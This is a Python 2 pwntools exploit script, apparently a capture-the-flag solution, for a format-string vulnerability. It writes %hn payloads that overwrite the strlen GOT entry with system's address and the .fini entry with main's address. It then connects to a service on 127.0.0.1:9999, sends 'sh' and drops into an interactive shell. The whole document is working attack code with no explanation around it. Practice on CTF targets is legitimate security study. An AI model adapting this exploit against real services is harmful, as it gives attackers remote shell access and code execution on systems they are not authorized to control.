from pwn import *

class FormatString:
    def __init__(self,leng = 0):
        self.leng = leng
    def set(self,value):
        ans = value-self.leng
        assert ans > 0
        self.leng += ans
        return ans

strlen_got = 0x08049a54
fini_got = 0x08049934

system_addr = 0x08048490
main_addr = 0x080485ed

word = "Nice to meet you, "

payload  = "AA"
payload += p32(strlen_got+2)
payload += p32(fini_got+2)
payload += p32(strlen_got)
payload += p32(fini_got)

FS = FormatString(len(word)+len(payload))

payload += "%{}c".format(FS.set((system_addr&0xffff0000) >> 16))
payload += "%12$hn"
payload += "%13$hn"
payload += "%{}c".format(FS.set(system_addr&0x0000ffff))
payload += "%14$hn"
payload += "%{}c".format(FS.set(main_addr&0x0000ffff))
payload += "%15$hn"

#print payload

r = remote("127.0.0.1",9999)
print r.readline()
r.sendline(payload)
print r.readline()[:50]
r.sendline('sh')
r.interactive()
